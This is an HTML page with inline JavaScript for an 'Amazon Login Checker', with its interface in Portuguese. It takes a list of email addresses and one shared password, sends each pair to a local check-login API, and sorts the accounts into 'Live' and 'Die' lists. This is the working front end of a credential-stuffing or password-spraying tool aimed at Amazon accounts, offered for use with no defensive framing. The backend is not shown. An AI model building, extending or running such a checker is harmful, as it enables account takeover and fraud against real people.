<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="../../css/GG.css">
    <title>Amazon Login Checker</title>
</head>
<body>
    <div class="dashboard">
        <h2>Menu</h2>
        <ul>
            <li><a href="dashboard.php">Início</a></li>
            <li><a href="#">Carregar Checker</a></li>
            <li><a href="#">Histórico</a></li>
            <li><a href="#">Configurações</a></li>
            <li><a href="#">Suporte</a></li>
        </ul>
    </div>
    <div class="container">
        <div class="checker">
            <textarea id="input-text" placeholder="Insira os emails para checagem de login na Amazon." rows="10"></textarea>
            <input type="password" id="password" placeholder="Insira a senha padrão para login">
            <div class="controls">
                <button id="start-check" class="control-button">Iniciar</button>
            </div>
        </div>
        <div class="results">
            <div class="result" id="live">
                <span>Live</span>
                <span class="count">0</span>
            </div>
            <div class="result" id="die">
                <span>Die</span>
                <span class="count">0</span>
            </div>
        </div>
        <div class="detailed-results">
            <div class="details" id="live-details">
                <h3>Live Results</h3>
                <pre id="live-list"></pre>
            </div>
            <div class="details" id="die-details">
                <h3>Die Results</h3>
                <pre id="die-list"></pre>
            </div>
        </div>
    </div>

    <script>
        document.getElementById('start-check').addEventListener('click', function() {
            const emails = document.getElementById('input-text').value.trim().split('\n');
            const password = document.getElementById('password').value.trim();

            if (emails.length > 0 && password) {
                emails.forEach(email => {
                    fetch('http://localhost:5000/api/check-login', { // API local ou o endpoint que você está usando
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ email: email, password: password })
                    })
                    .then(response => {
                        if (!response.ok) {
                            throw new Error('Erro na requisição: ' + response.status);
                        }
                        return response.json();
                    })
                    .then(data => {
                        if (data.error) {
                            alert('Erro ao testar login: ' + data.error);
                            return;
                        }
                        // Atualizar os contadores e listas de resultados
                        if (data.status === 'LIVE') {
                            const liveCount = document.getElementById('live').querySelector('.count');
                            liveCount.textContent = parseInt(liveCount.textContent) + 1;
                            document.getElementById('live-list').textContent += data.message + '\n';
                        } else {
                            const dieCount = document.getElementById('die').querySelector('.count');
                            dieCount.textContent = parseInt(dieCount.textContent) + 1;
                            document.getElementById('die-list').textContent += data.message + '\n';
                        }
                    })
                    .catch(error => {
                        console.error('Erro ao conectar com o servidor:', error);
                        alert('Falha ao conectar ao servidor. Verifique se o servidor está ativo e tente novamente.');
                    });
                });
            } else {
                alert('Por favor, insira emails e senha para checagem.');
            }
        });
    </script>
</body>
</html>
